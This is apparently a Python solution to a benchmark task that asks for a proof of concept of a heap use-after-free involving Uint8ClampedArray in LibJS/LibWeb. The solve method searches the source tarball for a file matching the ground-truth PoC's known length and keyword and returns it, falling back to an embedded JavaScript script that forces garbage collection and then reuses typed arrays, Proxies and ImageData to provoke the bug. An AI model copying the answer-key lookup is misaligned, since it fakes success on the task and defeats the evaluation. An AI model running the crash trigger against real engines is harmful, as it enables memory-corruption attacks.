import os
import tarfile


def _generate_fallback_poc() -> bytes:
    js = """
// PoC for LibJS/LibWeb Uint8ClampedArray heap-use-after-free style issues.
// The script stresses Uint8ClampedArray and ImageData in ways that are
// typical for lifetime / GC bugs: objects are kept alive in JS variables,
// garbage collection is forced, and the objects are used afterwards.

(function () {
    function safeGC() {
        try {
            if (typeof gc === "function") {
                // Call multiple times to encourage full collection.
                for (var i = 0; i < 4; ++i)
                    gc();
            }
        } catch (e) {
        }
    }

    function leakUint8ClampedArrays() {
        if (typeof Uint8ClampedArray !== "function" || typeof ArrayBuffer !== "function")
            return;

        var leaked = [];

        // Allocate many Uint8ClampedArray instances and keep JS references.
        for (var i = 0; i < 64; ++i) {
            var buf = new ArrayBuffer(1024 + i);
            var view = new Uint8ClampedArray(buf);
            view[0] = i & 0xff;
            if (view.length > 1)
                view[view.length - 1] = (255 - i) & 0xff;
            leaked.push(view);
        }

        // Force GC while views are still reachable from JS.
        safeGC();

        // Perform operations that dereference the internal backing store.
        for (var i = 0; i < leaked.length; ++i) {
            var v = leaked[i];
            try {
                for (var j = 0; j < 32 && j < v.length; ++j) {
                    v[j] = (v[j] + j + i) & 0xff;
                }

                if (typeof v.subarray === "function") {
                    var s = v.subarray(0, 16);
                    if (typeof s.fill === "function")
                        s.fill(0x7f);
                }

                if (typeof v.set === "function") {
                    v.set(v, 0);
                }
            } catch (e) {
            }
        }
    }

    function mixedTypedArrayStress() {
        if (typeof Uint8ClampedArray !== "function" || typeof ArrayBuffer !== "function")
            return;

        var ctors = [
            typeof Int8Array === "function" ? Int8Array : null,
            typeof Uint8Array === "function" ? Uint8Array : null,
            typeof Uint8ClampedArray === "function" ? Uint8ClampedArray : null,
            typeof Int16Array === "function" ? Int16Array : null,
            typeof Uint16Array === "function" ? Uint16Array : null,
            typeof Int32Array === "function" ? Int32Array : null,
            typeof Uint32Array === "function" ? Uint32Array : null,
            typeof Float32Array === "function" ? Float32Array : null,
            typeof Float64Array === "function" ? Float64Array : null
        ];

        var filtered = [];
        for (var i = 0; i < ctors.length; ++i) {
            if (ctors[i] !== null)
                filtered.push(ctors[i]);
        }

        for (var i = 0; i < filtered.length; ++i) {
            for (var j = 0; j < filtered.length; ++j) {
                var C1 = filtered[i];
                var C2 = filtered[j];
                var buf = new ArrayBuffer(256);
                var a = new C1(buf);
                var b = new C2(buf);

                for (var k = 0; k < a.length && k < 16; ++k)
                    a[k] = (k * 17 + i + j) & 0xff;

                try {
                    if (typeof b.set === "function")
                        b.set(a);
                    if (typeof b.copyWithin === "function")
                        b.copyWithin(0, 1, 8);
                } catch (e) {
                }

                safeGC();
            }
        }
    }

    function proxyStress() {
        if (typeof Uint8ClampedArray !== "function" || typeof ArrayBuffer !== "function")
            return;
        if (typeof Proxy !== "function")
            return;

        function makeProxy() {
            var buf = new ArrayBuffer(128);
            var target = new Uint8ClampedArray(buf);
            var handler = {
                get: function (t, prop, recv) {
                    if (prop === "length" || prop === "buffer")
                        safeGC();
                    return t[prop];
                },
                set: function (t, prop, value, recv) {
                    t[prop] = value;
                    safeGC();
                    return true;
                }
            };
            return new Proxy(target, handler);
        }

        for (var i = 0; i < 256; ++i) {
            var p = makeProxy();
            try {
                p[0] = i;
                if (typeof p.subarray === "function") {
                    var s = p.subarray(0, 8);
                    if (s.length > 0)
                        s[0] = (s[0] + 1) & 0xff;
                }
            } catch (e) {
            }
        }
    }

    function imageDataLeakStress() {
        var hasImageDataCtor = (typeof ImageData === "function");
        var hasDocument = (typeof document !== "undefined" &&
                           document !== null &&
                           typeof document.createElement === "function");

        var imageDatas = [];

        // Direct ImageData constructor, if available.
        if (hasImageDataCtor) {
            for (var i = 0; i < 16; ++i) {
                try {
                    var img = new ImageData(64, 64);
                    if (img.data && img.data.length > 0)
                        img.data[0] = i;
                    imageDatas.push(img);
                } catch (e) {
                }
            }
        }

        // Canvas-based ImageData, if running in LibWeb/DOM environment.
        if (hasDocument) {
            try {
                var canvas = document.createElement("canvas");
                canvas.width = 64;
                canvas.height = 64;
                var ctx = canvas.getContext && canvas.getContext("2d");
                if (ctx && ctx.getImageData && ctx.putImageData) {
                    for (var i = 0; i < 16; ++i) {
                        ctx.fillStyle = "rgba(" + (i & 255) + ",0,0,255)";
                        ctx.fillRect(0, 0, 1, 1);
                        try {
                            var img2 = ctx.getImageData(0, 0, 1, 1);
                            if (img2.data && img2.data.length > 0)
                                img2.data[0] = 255;
                            imageDatas.push(img2);
                        } catch (e) {
                        }
                    }
                }
            } catch (e) {
            }
        }

        if (imageDatas.length === 0)
            return;

        // Extract and keep references to underlying Uint8ClampedArray views.
        var views = [];
        for (var i = 0; i < imageDatas.length; ++i) {
            var d = imageDatas[i].data;
            if (d)
                views.push(d);
        }

        safeGC();

        for (var i = 0; i < views.length; ++i) {
            var v = views[i];
            try {
                for (var j = 0; j < 8 && j < v.length; ++j) {
                    v[j] = (v[j] + i + j) & 0xff;
                }
                if (typeof v.set === "function")
                    v.set(v);
            } catch (e) {
            }
        }
    }

    function run() {
        try { leakUint8ClampedArrays(); } catch (e) {}
        try { mixedTypedArrayStress(); } catch (e) {}
        try { proxyStress(); } catch (e) {}
        try { imageDataLeakStress(); } catch (e) {}
    }

    run();
})();
"""
    return js.encode("utf-8")


class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC input that attempts to trigger a heap use-after-free
        involving Uint8ClampedArray in LibJS/LibWeb.

        If the ground-truth PoC (length 6624 bytes containing 'Uint8ClampedArray')
        is present inside the source tarball, reuse it directly. Otherwise,
        return a handcrafted JavaScript PoC.
        """
        ground_truth_len = 6624

        try:
            with tarfile.open(src_path, "r:*") as tar:
                members = [m for m in tar.getmembers() if m.isfile()]

                # First, look for an exact-length PoC that mentions Uint8ClampedArray.
                for m in members:
                    if m.size != ground_truth_len:
                        continue
                    try:
                        f = tar.extractfile(m)
                        if f is None:
                            continue
                        data = f.read()
                    except Exception:
                        continue
                    if b"Uint8ClampedArray" in data:
                        return data
        except Exception:
            # If anything goes wrong while reading the tarball,
            # fall back to our synthetic PoC.
            pass

        # Fallback: synthetic JavaScript PoC.
        return _generate_fallback_poc()